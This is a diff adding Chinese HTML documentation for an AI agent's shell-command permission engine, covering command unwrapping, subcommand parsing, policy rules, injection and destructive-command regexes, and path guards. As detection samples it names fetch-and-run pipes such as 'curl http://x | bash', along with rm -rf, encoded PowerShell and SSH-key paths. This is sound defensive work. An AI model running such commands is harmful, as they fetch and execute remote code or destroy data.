+        <tr><td class="k">无外壳</td><td><code>ls -la</code>、<code>rm -rf /tmp</code>、<code>ls; rm x</code> —— 仍可继续拆子命令</td></tr>
+        <tr><td class="k">外壳不在命令位</td><td><code>echo bash -c 'rm'</code> 保持原样（防误剥）</td></tr>
+        <tr><td class="k">第二层</td><td>只剥一层，不递归</td></tr>
+      </tbody>
+    </table>
+
+    <h3>4. 拆子命令（对原文或剥壳后的串）</h3>
+    <div class="callout warn" style="margin-bottom:10px">
+      <b>不是</b> <code>split(';')</code> / 按分隔符傻切。叶子来自语法解析；失败则<strong>不产生</strong> <code>subcommand</code>。
+      <strong>不以</strong>「是否剥成功」、也<strong>不以</strong> <code>SHELL_TOOLS</code> 五元组为拆分资格。
+    </div>
+    <ul style="margin:0 0 10px;padding-left:18px;font-size:13px;line-height:1.55">
+      <li><b>输入：</b>canonical（剥壳后；无外壳则原文）。</li>
+      <li><b>Phase 1 方言门控：</b><code>supports_posix_subcommand_split</code> — 仅 <code>posix_shell</code> / <code>unknown</code> 调用 bash AST（tree-sitter bash + 保守 fallback）。</li>
+      <li><b>Phase 2（未做）：</b>PowerShell / CMD 专用拆分后端。</li>
+      <li><b>对象：</b>payload 叶子（<code>ls</code> / <code>rm</code>…），不是再识别解析器。</li>
+    </ul>
+
+    <table class="ref" style="margin-top:8px">
+      <thead><tr><th>解析结果</th><th>引擎行为</th><th>含义</th></tr></thead>
+      <tbody>
+        <tr>
+          <td class="k">simple + 多条叶子<br>（或一条叶子 ≠ 整串）</td>
+          <td>追加 <code>subcommand</code>×N</td>
+          <td>如 <code>ls; rm x</code> → <code>ls</code>、<code>rm x</code></td>
+        </tr>
+        <tr>
+          <td class="k">simple + 仅一条且 = 整串</td>
+          <td><strong>不追加</strong></td>
+          <td>与 original/unwrapped 重复</td>
+        </tr>
+        <tr>
+          <td class="k">too_complex</td>
+          <td>不追加</td>
+          <td><code>$(…)</code> / 子 shell / heredoc / 命令组等；结构底线可另抬等级</td>
+        </tr>
+        <tr>
+          <td class="k">parse_unavailable</td>
+          <td>不追加</td>
+          <td>后端不可用或无法安全分析</td>
+        </tr>
+      </tbody>
+    </table>
+    <p class="note-line" style="margin-top:8px">剥壳未覆盖：<code>ksh -c</code> / <code>fish -c</code>（入口可有其名，表 B 不剥）。fallback <strong>不会</strong>按 <code>;</code> 切开。</p>
+
+    <h3>5. 候选组合速查</h3>
+    <table class="ref">
+      <thead><tr><th>输入</th><th>候选</th></tr></thead>
+      <tbody>
+        <tr><td>非入口（如 <code>read_file</code>）</td><td>仅 original</td></tr>
+        <tr><td>POSIX 入口 · 单叶 <code>ls</code></td><td>original</td></tr>
+        <tr><td>POSIX / unknown · <code>ls; rm x</code></td><td>original + subcommand×N（AST 成功时）</td></tr>
+        <tr><td><code>sh</code> + <code>ls; rm x</code></td><td>同上（不再被五元组挡住）</td></tr>
+        <tr><td><code>bash -c "ls; rm x"</code></td><td>original + unwrapped + 内层 subcommand×N</td></tr>
+        <tr><td>PowerShell / CMD 入口 · 复合命令</td><td>original（±unwrapped）；<strong>Phase 1 不拆</strong> subcommand</td></tr>
+        <tr><td><code>echo bash -c 'rm'</code></td><td>仅 original（不剥）</td></tr>
+      </tbody>
+    </table>
+
+    <h3 id="check-permission-flow">6. check_permission 流程</h3>
+    <p class="sub" style="margin-top:0"><code>PermissionManager/Engine.check_permission(tool_name, tool_args)</code> · 不改真实执行参数</p>
+
+    <div class="stack" style="max-width:720px">
+      <div class="box hi-gray"><div class="n">① 收到请求</div><div class="d"><code>tool_name</code> + <code>tool_args</code></div></div>
+      <div class="box"><div class="n">② enabled？</div><div class="d">否 → ALLOW；是 → 继续</div></div>
+      <div class="box hi-orange"><div class="n">③ 表 A：命令入口？</div><div class="d"><code>_COMMAND_ENTRY_TOOLS</code>。<b>否</b> → 仅 ORIGINAL，跳到 ⑦。<b>是</b> → 继续（不改写 tool_name）。</div></div>
+      <div class="box"><div class="n">④ ORIGINAL</div><div class="d">原文 + 方言</div></div>
+      <div class="box hi-green"><div class="n">⑤ 表 B：剥壳</div><div class="d"><code>canonicalize</code> 扫串内启动器；有则追加 UNWRAPPED</div></div>
+      <div class="box hi-orange"><div class="n">⑥ 按方言拆子命令</div><div class="d"><code>posix_shell</code> / <code>unknown</code> → bash AST；PowerShell / CMD → Phase 1 跳过。多叶子 → SUBCOMMAND×N</div></div>
+      <div class="box"><div class="n">⑦ approval 短路</div><div class="d">ORIGINAL / UNWRAPPED 命中 approval → 整次 ALLOW</div></div>
+      <div class="box"><div class="n">⑧ 逐候选跑组件</div><div class="d">取各组件意见</div></div>
+      <div class="box hi-gray"><div class="n">⑨ 合并最严 → 日志 → 返回</div><div class="d"><code>PermissionResult</code></div></div>
+    </div>
+
+    <div class="explain" style="margin-top:14px">
+      <h4>例：代跑入口 + 串内嵌套 bash</h4>
+      <p class="mono" style="margin:6px 0 8px"><code>tool_name = "mcp_exec_command"</code><br><code>tool_args = {"command": "bash -c 'ls; rm x'"}</code></p>
+      <ul>
+        <li>③ 表 A 命中 → 展开。</li>
+        <li>⑤ 串内 <code>bash -c</code> → UNWRAPPED = <code>ls; rm x</code>。</li>
+        <li>⑥ 方言 unknown（或显式 posix）→ bash AST → SUBCOMMAND <code>ls</code>、<code>rm x</code>。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Tiered (merged) -->
+  <section class="sec" id="tiered">
+    <h2>2. TieredPolicyComponent</h2>
+    <p class="sub">命令 / 工具分层策略 · 默认参与 · shell 工具含结构底线</p>
+    <div class="box hi-green" style="margin-bottom:12px">
+      <div class="n">看哪些候选</div>
+      <div class="d">原文 / 剥壳 / 子命令<strong>都会</strong>跑 approval→rules→tools→defaults（及 shell 零配置兜底）。
+        <b>结构底线</b>只在原文与剥壳上跑，子命令不跑。非 shell 工具也可走本组件（无结构底线，无规则时可弃权）。</div>
+    </div>
+
+    <h3 id="tiered-order">2.1 判定顺序与结构底线</h3>
+    <div class="grid cols-2">
+      <div class="panel">
+        <div class="ph green">组件内顺序（未短路时）</div>
+        <div class="stack">
+          <div class="box hi-green"><div class="n">1. approval_overrides</div><div class="d">命中 → ALLOW（仅 action=allow 生效；引擎层还可对整条/剥壳整调用短路）</div></div>
+          <div class="box"><div class="n">2. rules（builtin + 用户）</div><div class="d">同时匹配取最严；可用同 pattern 覆盖内置 action</div></div>
+          <div class="box"><div class="n">3. tools.&lt;name&gt;</div><div class="d">整工具基线（含 deny，无早退）</div></div>
+          <div class="box"><div class="n">4. defaults.*</div><div class="d">全局默认</div></div>
+          <div class="box"><div class="n">5. shell 兜底 ASK</div><div class="d">非 shell 可弃权（None）</div></div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="ph orange">结构底线（仅 shell · 原文/剥壳）</div>
+        <div class="box hi-orange"><div class="n">作用</div><div class="d">规则比的是看得见的文本；底线拦「解析看不清 / 运行时才长出文本」的结构风险。先走左侧判定，再只抬不降。</div></div>
+        <div class="box"><div class="n">何时跑</div><div class="d">shell 工具名 + 原文/剥壳候选 + 命令非空；子命令候选不跑；approval 整调用短路时整段不跑。</div></div>
+      </div>
+    </div>
+
+    <div class="explain">
+      <h4>结构底线说明</h4>
+      <p><b>AST</b> = Abstract Syntax Tree（抽象语法树），不是「子命令」的简称。用 AST（优先 tree-sitter bash，没有则保守扫描）解析整条命令；能拆时才得到子命令列表。底线看的是<strong>整条/剥壳</strong>的结构，不会对每个子命令再跑一遍。</p>
+      <p>四类检查写死都会做（命中后的等级见后文 <code>guard_actions</code>，缺省 ask）。对照例子：</p>
+      <ul>
+        <li><b>too_complex</b> — 解析器认为结构不可信、不宜当普通命令拆。<br>
+          例：语法破损的命令；或含 <code>$(…)</code> / 子 shell / 命令组等复杂结构时，tree-sitter 常直接标 too_complex（可与下面 structure_guard 同时命中）。</li>
+        <li><b>parse_unavailable</b> — 没有可靠 AST（常见：未装 tree-sitter，走降级扫描），且原文带风险结构特征。<br>
+          例：降级路径下 <code>echo hi &gt; f.txt</code>（含重定向等特征，扫描器不敢当 simple）。注意：这里抬的是「解析不可用」档；重定向<strong>目标路径</strong>仍归 FileGuard，不是 structure_guard。</li>
+        <li><b>structure_guard</b> — 命令替换 / 进程替换 / heredoc（故意<strong>不含</strong>单独的 <code>&gt;</code> <code>&gt;&gt;</code> <code>&lt;</code> 重定向）。<br>
+          例：<code>echo $(whoami)</code>；<code>cat &lt;(echo x)</code>；<code>cat &lt;&lt;EOF</code> … <code>EOF</code>。<br>
+          反例：<code>echo hi &gt; /tmp/a</code> 不靠本项拦写文件（路径侧处理）。</li>
+        <li><b>interpreter_sink</b> — 管道把数据喂给解释器（非首段是 bash/sh/python/node/pwsh 等）。<br>
+          例：<code>curl http://x | bash</code> → 命中。<br>
+          反例：<code>ls | wc -l</code> → 下游不是解释器，不命中。</li>
+      </ul>
+      <p>安全例：<code>ls</code> / <code>echo hello</code> → 解析 simple 且无上述特征 → 底线空，结论完全由左侧规则链决定。</p>
+    </div>
+
+    <h3 id="tiered-keys">2.2 配置项</h3>
+    <p class="sub" style="margin-top:0">顶层公共段，主要由本组件读取；部分字段亦被 NetGuard / FileGuard 共用</p>
+    <table class="ref">
+      <thead>
+        <tr><th>配置项</th><th>类型</th><th>可取值</th><th>默认（缺省时）</th><th>说明</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="k">permission_mode</td>
+          <td>string</td>
+          <td><code>normal</code> · <code>strict</code></td>
+          <td><code>normal</code></td>
+          <td>非法值回落 <code>normal</code>。仅当规则<strong>无 action</strong>时参与 severity 换算，见下表</td>
+        </tr>
+        <tr>
+          <td class="k">tools</td>
+          <td>object</td>
+          <td>工具名 → <code>allow</code>/<code>ask</code>/<code>deny</code></td>
+          <td>无基线</td>
+          <td>整工具基线。亦可 <code>bash: {"*": "allow"}</code> 写法</td>
+        </tr>
+        <tr>
+          <td class="k">defaults</td>
+          <td>object</td>
+          <td>通常 <code>"*": allow|ask|deny|undetermined</code></td>
+          <td>无</td>
+          <td>与 file_guard.defaults、net_guard.defaults <strong>同名不同义</strong></td>
+        </tr>
+        <tr>
+          <td class="k">rules</td>
+          <td>list[object]</td>
+          <td>见下方规则字段</td>
+          <td><code>[]</code></td>
+          <td><code>layer: builtin</code> 视为内置层；仅 <code>match_type: command</code>（或缺省）生效</td>
+        </tr>
+        <tr>
+          <td class="k">approval_overrides</td>
+          <td>list[object]</td>
+          <td>同规则形；仅 action=allow 生效</td>
+          <td><code>[]</code></td>
+          <td>「始终允许」落盘目标；非 allow 条目被忽略</td>
+        </tr>
+        <tr>
+          <td class="k">package_builtin_rules</td>
+          <td>bool / string</td>
+          <td>bool；或字符串 <code>false/0/no/off</code> 视为关</td>
+          <td>开（缺省为真）</td>
+          <td>关则清空包内置命令规则；亦影响 FileGuard 敏感路径与 NetGuard 包规则</td>
+        </tr>
+        <tr>
+          <td class="k">guard_actions</td>
+          <td>object</td>
+          <td>四键 → allow/ask/deny</td>
+          <td>四键均为 <code>ask</code></td>
+          <td>键：too_complex / parse_unavailable / structure_guard / interpreter_sink</td>
+        </tr>
+        <tr>
+          <td class="k">shell_guard</td>
+          <td>object</td>
+          <td>旧版兼容</td>
+          <td>无</td>
+          <td>旧版键：unknown_structure=false → 前两项 allow；interpreter_sink=false → 该项 allow。优先被 guard_actions 覆盖</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="panel" style="margin-top:12px">
+      <div class="ph gray">无 action 时：severity × permission_mode → 实际等级</div>
+      <table class="ref">
+        <thead>
+          <tr>
+            <th>severity（规则上）</th>
+            <th><code>permission_mode: normal</code></th>
+            <th><code>permission_mode: strict</code></th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td class="k">LOW</td><td>allow</td><td>allow</td></tr>
+          <tr><td class="k">MEDIUM</td><td>allow</td><td>allow</td></tr>
+          <tr><td class="k">HIGH</td><td>ask</td><td>ask</td></tr>
+          <tr><td class="k">CRITICAL</td><td>ask</td><td>deny</td></tr>
+          <tr><td class="k">（空 / 未写）</td><td>ask</td><td>ask</td></tr>
+        </tbody>
+      </table>
+      <p class="note-line">有 <code>action</code> 的规则不走本表；<code>tools</code> / <code>defaults</code> / <code>approval_overrides</code> / <code>guard_actions</code> 也不受 <code>permission_mode</code> 影响。</p>
+    </div>
+
+    <h3 id="tiered-rules">2.3 规则字段与示例</h3>
+    <p class="sub" style="margin-top:0">rules[] / approval_overrides[] 元素结构</p>
+    <div class="grid cols-2">
+      <div class="panel">
+        <div class="ph gray">规则对象字段</div>
+        <table class="ref">
+          <tr><th>字段</th><th>可取值 / 默认</th></tr>
+          <tr><td class="k">id</td><td>string，可选；用于日志标签</td></tr>
+          <tr><td class="k">tools</td><td>具体工具名列表，如 <code>[bash, powershell]</code>。<strong>不支持</strong>类别词 <code>shell</code></td></tr>
+          <tr><td class="k">pattern</td><td>匹配串。前缀 <code>re:</code>=正则；含通配符=通配；否则全等</td></tr>
+          <tr><td class="k">match_type</td><td>见下方说明</td></tr>
+          <tr><td class="k">action</td><td><code>allow</code> / <code>ask</code> / <code>deny</code>。有 action 时优先，不走 severity</td></tr>
+          <tr><td class="k">severity</td><td>仅无 action 时生效；换算见上方「severity × permission_mode」表</td></tr>
+          <tr><td class="k">layer</td><td><code>builtin</code> → 内置层；其它值或缺省 → 用户层（影响归类与「同 tools+pattern 覆盖内置 action」）</td></tr>
+        </table>
+        <div class="callout info" style="margin-top:8px">
+          <b>match_type 做什么：</b>不是「怎么匹配 pattern」的开关，而是<strong>这条规则要不要进 TieredPolicy</strong>。
+          缺省或 <code>command</code> → 参与命令文本匹配；写成其它值（如历史遗留的 <code>path</code> / <code>network</code>）→ 本组件整条忽略（等于没配）。
+          pattern 本身怎么比，看有没有 <code>re:</code> / 通配符 / 全等，与 match_type 无关。
+        </div>
+        <div class="callout warn" style="margin-top:8px">
+          <b>layer 做什么：</b>配置加载时把 <code>rules</code> 拆成内置层与用户层。
+          <code>layer: builtin</code> 归内置（也可被 <code>package_builtin_rules</code> 控制）；用户规则若与某条内置规则<strong>相同 tools + pattern</strong>且带 <code>action</code>，则只覆盖该内置的判罚，不是按 <code>id</code> 覆盖。
+        </div>
+      </div>
+      <div class="panel">
+        <div class="ph green">示例（覆盖上表全部键与可取值）</div>
+        <pre class="ex"><span class="c"># permission_mode: normal | strict</span>
+<span class="k">permission_mode</span>: <span class="s">normal</span>
+<span class="c"># package_builtin_rules: true | false | "0"|"false"|"no"|"off"</span>
+<span class="k">package_builtin_rules</span>: <span class="n">true</span>
+
+<span class="c"># tools 值: allow | ask | deny；亦可 bash: {"*": "allow"}</span>
+<span class="k">tools</span>:
+  <span class="k">bash</span>: <span class="s">allow</span>
+  <span class="k">powershell</span>: <span class="s">ask</span>
+  <span class="k">mcp_exec_command</span>:
+    <span class="s">"*"</span>: <span class="s">deny</span>
+
+<span class="c"># defaults["*"]: allow | ask | deny | undetermined</span>
+<span class="k">defaults</span>:
+  <span class="s">"*"</span>: <span class="s">ask</span>
+
+<span class="k">rules</span>:
+  - <span class="k">id</span>: block_curl_pipe
+    <span class="k">layer</span>: <span class="s">user</span>                  <span class="c"># 非 builtin / 缺省 → 用户层</span>
+    <span class="k">tools</span>: [<span class="s">bash</span>, <span class="s">powershell</span>]
+    <span class="k">pattern</span>: <span class="s">"re:curl.+\\|\\s*sh"</span>   <span class="c"># re: 正则</span>
+    <span class="k">match_type</span>: <span class="s">command</span>          <span class="c"># 缺省同此；本组件只认 command</span>
+    <span class="k">action</span>: <span class="s">deny</span>                 <span class="c"># allow | ask | deny</span>
+  - <span class="k">id</span>: warn_rm_rf
+    <span class="k">tools</span>: [<span class="s">bash</span>]
+    <span class="k">pattern</span>: <span class="s">"rm -rf *"</span>             <span class="c"># 通配</span>
+    <span class="k">match_type</span>: <span class="s">command</span>
+    <span class="k">severity</span>: <span class="s">HIGH</span>             <span class="c"># 无 action 时走 severity×mode 表</span>
+  - <span class="k">id</span>: exact_echo
+    <span class="k">tools</span>: [<span class="s">bash</span>]
+    <span class="k">pattern</span>: <span class="s">"echo hello"</span>          <span class="c"># 全等</span>
+    <span class="k">action</span>: <span class="s">allow</span>
+  - <span class="k">id</span>: package_sample
+    <span class="k">layer</span>: <span class="s">builtin</span>               <span class="c"># 归内置层</span>
+    <span class="k">tools</span>: [<span class="s">bash</span>]
+    <span class="k">pattern</span>: <span class="s">"re:^sudo\\b"</span>
+    <span class="k">match_type</span>: <span class="s">command</span>
+    <span class="k">action</span>: <span class="s">ask</span>
+  - <span class="k">id</span>: ignored_path_rule
+    <span class="k">tools</span>: [<span class="s">bash</span>]
+    <span class="k">pattern</span>: <span class="s">"/etc/*"</span>
+    <span class="k">match_type</span>: <span class="s">path</span>             <span class="c"># ≠ command → Tiered 整条忽略</span>
+    <span class="k">action</span>: <span class="s">deny</span>
+
+<span class="k">approval_overrides</span>:                   <span class="c"># 同规则形；仅 action=allow 生效</span>
+  - <span class="k">id</span>: remember_rm_tmp
+    <span class="k">tools</span>: [<span class="s">bash</span>]
+    <span class="k">pattern</span>: <span class="s">"rm -rf /tmp/ok"</span>
+    <span class="k">match_type</span>: <span class="s">command</span>
+    <span class="k">action</span>: <span class="s">allow</span>
+
+<span class="c"># guard_actions 四键均要可配：allow | ask | deny</span>
+<span class="k">guard_actions</span>:
+  <span class="k">too_complex</span>: <span class="s">ask</span>
+  <span class="k">parse_unavailable</span>: <span class="s">ask</span>
+  <span class="k">structure_guard</span>: <span class="s">deny</span>
+  <span class="k">interpreter_sink</span>: <span class="s">allow</span>
+
+<span class="c"># 旧版键；可被上面 guard_actions 覆盖</span>
+<span class="k">shell_guard</span>:
+  <span class="k">unknown_structure</span>: <span class="n">true</span>             <span class="c"># false → too_complex/parse_unavailable 视为 allow</span>
+  <span class="k">interpreter_sink</span>: <span class="n">true</span>              <span class="c"># false → interpreter_sink 视为 allow</span></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- Allowlist / Injection / Destructive -->
+  <section class="sec" id="toolguard">
+    <h2>3. CommandAllowlist · Injection · DestructiveWarning</h2>
+    <p class="sub">三个 toolguard 组件 · 均只处理 shell；候选范围见各列「看哪些候选」，总表见 <a href="#candidate-scope">1.1 各组件看哪些候选</a></p>
+    <div class="grid cols-3">
+      <div class="panel">
+        <div class="ph green">CommandAllowlist <span class="badge on">默认可生效</span></div>
+        <div class="box hi-green"><div class="n">看哪些候选</div><div class="d"><b>原文 / 剥壳</b>；子命令弃权。取命令首词（空白切开第一段）与名单比。</div></div>
+        <table class="ref">
+          <tr><th>项</th><th>说明</th></tr>
+          <tr><td class="k">shell_allowlist</td><td>list[str] 或 null</td></tr>
+          <tr><td><b>缺键</b></td><td>启用下方默认 30 个前缀</td></tr>
+          <tr><td><b>null / []</b></td><td>关闭 → 本组件 ALLOW（disabled）</td></tr>
+          <tr><td><b>非空列表</b></td><td>首词命中 → ALLOW；否则 DENY</td></tr>
+        </table>
+        <div class="box" style="margin-top:6px"><div class="n">默认前缀（缺键时）</div><div class="d" style="font-family:Consolas,'Courier New',monospace;font-size:11px;line-height:1.55">echo · rg · ls · dir · cd · pwd · python · python3 · pip · pip3 · npm · node · git · cat · type · mkdir · md · rm · rd · cp · copy · mv · move · grep · find · curl · wget · ps · df · ping</div></div>
+        <pre class="ex" style="margin-top:6px;font-size:11px"><span class="c"># 关闭白名单（验收常用）</span>
+<span class="k">shell_allowlist</span>: <span class="n">null</span>
+
+<span class="c"># 自定义</span>
+<span class="k">shell_allowlist</span>: [<span class="s">echo</span>, <span class="s">ls</span>, <span class="s">git</span>]</pre>
+        <div class="box"><div class="n">matched_rule</div><div class="d"><code>shell_allowlist:matched</code> / <code>not_allowed</code> / <code>disabled</code></div></div>
+      </div>
+      <div class="panel">
+        <div class="ph red">Injection <span class="badge code">无配置项</span></div>
+        <div class="box hi-orange"><div class="n">看哪些候选</div><div class="d"><b>原文 / 剥壳</b>；子命令弃权。正则写死在 <code>injection.py</code>，yaml <b>无键</b>。命中 → DENY；未命中 → 本组件 ALLOW。</div></div>
+        <div class="box"><div class="n">POSIX 3 种 · 命令例子</div><div class="d" style="line-height:1.55">
+          ① 反引号：<code>echo `whoami`</code><br>
+          ② 美元括号：<code>echo $(id)</code><br>
+          ③ 进程替换：<code>cat &lt;(echo secret)</code> / <code>diff &gt;(cmd1) &gt;(cmd2)</code>
+        </div></div>
+        <div class="box"><div class="n">PowerShell 4 种 · 命令例子</div><div class="d" style="line-height:1.55">
+          ① iex：<code>iex "Get-Process"</code> / <code>Invoke-Expression $s</code><br>
+          ② 编码嵌套壳：<code>pwsh -EncodedCommand aGVsbG8=</code><br>
+          ③ 动态调用：<code>&amp; (Get-Command notepad)</code> / <code>&amp; $cmd</code><br>
+          ④ ScriptBlock：<code>[ScriptBlock]::Create("Get-Date")</code>
+        </div></div>
+      </div>
+      <div class="panel">
+        <div class="ph gray">DestructiveWarning <span class="badge code">无配置项</span></div>
+        <div class="box hi-gray"><div class="n">配置在哪？</div><div class="d"><b>没有。</b>不在 permissions.yaml。规则与文案写死在 <code>toolguard/destructive_warning.py</code> 的 <code>_BASH_RULES</code> / <code>_POWERSHELL_RULES</code>，无法用配置开关或改文案。</div></div>
+        <div class="box"><div class="n">看哪些候选</div><div class="d">shell 的<strong>原文 / 剥壳 / 子命令</strong>都会跑。按序正则 search，<b>第一条</b>命中 → 写入 <code>warnings</code>；<b>不改</b> allow/ask/deny。</div></div>
+        <div class="box"><div class="n">输出</div><div class="d"><code>PermissionResult.warnings = ["&lt;英文文案&gt;"]</code>。有警告 ≠ 已拦截。完整正则与文案见下方表。</div></div>
+      </div>
+    </div>
+    <div class="callout warn" style="margin-top:12px">shell_allowlist <b>缺键 ≠ 关闭</b>。省略该键会启用默认 30 前缀，易导致「预期 ASK/ALLOW、实际 DENY」。</div>
+
+    <div class="explain">
+      <h4>Injection：正则与命令例子（源码字面量）</h4>
+      <table class="ref">
+        <thead><tr><th>方言</th><th>正则（代码）</th><th>命令例子</th><th>matched_rule</th></tr></thead>
+        <tbody>
+          <tr><td>POSIX</td><td><code>(?&lt;!')`[^`]+`</code></td><td><code>echo `whoami`</code></td><td>backtick command substitution</td></tr>
+          <tr><td>POSIX</td><td><code>\$\(</code></td><td><code>echo $(id)</code></td><td>$() command substitution</td></tr>
+          <tr><td>POSIX</td><td><code>[<>]\(</code></td><td><code>cat &lt;(echo x)</code></td><td>process substitution &lt;() or &gt;()</td></tr>
+          <tr><td>PowerShell</td><td><code>(?i)\b(?:invoke-expression|iex)\b</code></td><td><code>iex "Get-Process"</code></td><td>Invoke-Expression</td></tr>
+          <tr><td>PowerShell</td><td><code>(?i)\b(?:powershell|powershell\.exe|pwsh|pwsh\.exe)\b[^\n]*-encodedcommand\b</code></td><td><code>pwsh -EncodedCommand aGVsbG8=</code></td><td>nested encoded command</td></tr>
+          <tr><td>PowerShell</td><td><code>(^|[\s;(])&amp;\s*(?:\(|\$)</code></td><td><code>&amp; (Get-Command notepad)</code></td><td>dynamic call operator</td></tr>
+          <tr><td>PowerShell</td><td><code>(?i)\[scriptblock\]::create\s*\(</code></td><td><code>[ScriptBlock]::Create("Get-Date")</code></td><td>dynamic ScriptBlock creation</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="explain">
+      <h4>DestructiveWarning：完整正则 → warnings 文案（源码字面量）</h4>
+      <p>无 yaml 配置。下列即 <code>destructive_warning.py</code> 中的全部条目；文案原样写入 <code>warnings[0]</code>。</p>
+      <table class="ref">
+        <thead><tr><th>方言</th><th>正则（代码）</th><th>warnings 文案（完整）</th></tr></thead>
+        <tbody>
+          <tr><td>POSIX</td><td><code>\bgit\s+reset\s+--hard\b</code></td><td>May discard uncommitted changes</td></tr>
+          <tr><td>POSIX</td><td><code>\bgit\s+push\b[^\n]*(?:--force|-f)\b</code></td><td>May overwrite remote history</td></tr>
+          <tr><td>POSIX</td><td><code>\bgit\s+clean\s+-[a-zA-Z]*f</code></td><td>May permanently delete untracked files</td></tr>
+          <tr><td>POSIX</td><td><code>\bgit\s+checkout\s+--\s+\.</code></td><td>May discard all unstaged changes</td></tr>
+          <tr><td>POSIX</td><td><code>\bgit\s+stash\s+(?:drop|clear)\b</code></td><td>May permanently discard stashed changes</td></tr>
+          <tr><td>POSIX</td><td><code>\bgit\s+branch\s+-D\b</code></td><td>May force-delete a branch</td></tr>
+          <tr><td>POSIX</td><td><code>\bgit\s+commit\s+--amend\b</code></td><td>May rewrite the last commit</td></tr>
+          <tr><td>POSIX</td><td><code>\bgit\s+(?:push|commit|merge)\b[^\n]*--no-verify\b</code></td><td>May skip safety hooks</td></tr>
+          <tr><td>POSIX</td><td><code>\bDROP\s+(?:TABLE|DATABASE)\b</code>（IGNORECASE）</td><td>May drop database objects</td></tr>
+          <tr><td>POSIX</td><td><code>\bTRUNCATE\s+TABLE\b</code>（IGNORECASE）</td><td>May truncate database table</td></tr>
+          <tr><td>POSIX</td><td><code>\bkubectl\s+delete\b</code></td><td>May delete Kubernetes resources</td></tr>
+          <tr><td>POSIX</td><td><code>\bterraform\s+destroy\b</code></td><td>May destroy Terraform infrastructure</td></tr>
+          <tr><td>POSIX</td><td><code>\bsudo\b</code></td><td>sudo may require a password in non-interactive mode; configure NOPASSWD or run as root</td></tr>
+          <tr><td>PowerShell</td><td><code>(?i)\bremove-item\b[^\n]*-(?:recurse|force)\b</code></td><td>May permanently remove files or directories</td></tr>
+          <tr><td>PowerShell</td><td><code>(?i)\bclear-content\b</code></td><td>May remove file contents</td></tr>
+          <tr><td>PowerShell</td><td><code>(?i)\bset-content\b</code></td><td>May overwrite file contents</td></tr>
+          <tr><td>PowerShell</td><td><code>(?i)\brename-item\b</code></td><td>May rename or replace files</td></tr>
+          <tr><td>PowerShell</td><td><code>(?i)\bmove-item\b</code></td><td>May move or overwrite files</td></tr>
+          <tr><td>PowerShell</td><td><code>\bgit\s+reset\s+--hard\b</code></td><td>May discard uncommitted changes</td></tr>
+          <tr><td>PowerShell</td><td><code>\bgit\s+push\b[^\n]*(?:--force|-f)\b</code></td><td>May overwrite remote history</td></tr>
+          <tr><td>PowerShell</td><td><code>\bgit\s+commit\s+--amend\b</code></td><td>May rewrite the last commit</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- FileGuard -->
+  <section class="sec" id="fileguard">
+    <h2>4. FileGuard</h2>
+    <p class="sub">可配置路径防护 · 默认需显式启用或存在 external_directory / trusted_dirs</p>
+    <div class="box hi-orange" style="margin-bottom:12px">
+      <div class="n">看哪些候选</div>
+      <div class="d">只看<strong>原文 / 剥壳</strong>；<strong>子命令弃权</strong>（路径在整视图抽取）。非 shell 工具通常只有原文候选。</div>
+    </div>
+    <div class="grid cols-2">
+      <div class="panel">
+        <div class="ph orange">FileGuard 配置</div>
+        <table class="ref">
+          <tr><th>键</th><th>类型 / 可取值</th><th>默认</th></tr>
+          <tr>
+            <td class="k">file_guard.enabled</td>
+            <td>bool</td>
+            <td>未写：有 external_directory 或 trusted_dirs 则 true，否则 false</td>
+          </tr>
+          <tr>
+            <td class="k">file_guard.defaults</td>
+            <td>read/write/exec → allow|ask|deny</td>
+            <td>各轴 ask（启用时）</td>
+          </tr>
+          <tr>
+            <td class="k">file_guard.workspace</td>
+            <td>read/write/exec → allow|ask|deny</td>
+            <td>无。只配<strong>三轴策略</strong>，不写路径；路径 = 运行时 workspace 根</td>
+          </tr>
+          <tr>
+            <td class="k">file_guard.paths[]</td>
+            <td>path · match(prefix|glob) · read/write/exec</td>
+            <td><code>[]</code></td>
+          </tr>
+          <tr>
+            <td class="k">external_directory</td>
+            <td>str 或 map（顶层键，不在 file_guard 内）</td>
+            <td>无。旧版顶层配置，见下方说明（动作须显式写 allow/ask/deny）</td>
+          </tr>
+          <tr>
+            <td class="k">composition.source_order</td>
+            <td>list[str]</td>
+            <td>
+              顶层键（与 <code>file_guard</code> 同级）。无则普通判定（所有 paths 混比）。
+              出现 <code>composition</code> 则进入<strong>多层叠加</strong>：合法层名仅 <code>user</code> / <code>cloud</code> / <code>builtin</code>（对应 path 规则上的 <code>layer</code>）。
+              列表顺序 = 判定顺序：任一命中层 deny 立刻生效 → 否则取<strong>第一个有命中的层</strong>内最长前缀/最严 → 都未命中才走 defaults。
+              列表含 <code>user</code> 时才纳入 <code>runtime.trusted_dirs</code> 与旧 <code>external_directory</code> 迁移。
+            </td>
+          </tr>
+        </table>
+      </div>
+      <div class="panel">
+        <div class="ph green">示例</div>
+        <pre class="ex"><span class="k">file_guard</span>:
+  <span class="k">enabled</span>: <span class="n">true</span>                    <span class="c"># true | false</span>
+  <span class="k">defaults</span>:                         <span class="c"># 轴值: allow | ask | deny</span>
+    <span class="k">read</span>: <span class="s">ask</span>
+    <span class="k">write</span>: <span class="s">deny</span>
+    <span class="k">exec</span>: <span class="s">ask</span>
+  <span class="k">workspace</span>:
+    <span class="k">read</span>: <span class="s">allow</span>
+    <span class="k">write</span>: <span class="s">allow</span>
+    <span class="k">exec</span>: <span class="s">allow</span>
+  <span class="k">paths</span>:
+    - <span class="k">path</span>: <span class="s">"**/.ssh/**"</span>
+      <span class="k">match</span>: <span class="s">glob</span>                 <span class="c"># glob | prefix</span>
+      <span class="k">read</span>: <span class="s">ask</span>
+      <span class="k">write</span>: <span class="s">deny</span>
+      <span class="k">exec</span>: <span class="s">deny</span>
+    - <span class="k">path</span>: <span class="s">"/etc"</span>
+      <span class="k">match</span>: <span class="s">prefix</span>
+      <span class="k">read</span>: <span class="s">ask</span>
+      <span class="k">write</span>: <span class="s">deny</span>
+      <span class="k">exec</span>: <span class="s">deny</span>
+<span class="k">external_directory</span>:                 <span class="c"># 旧版顶层键：str 或 map</span>
+  <span class="s">"*"</span>: <span class="s">ask</span>
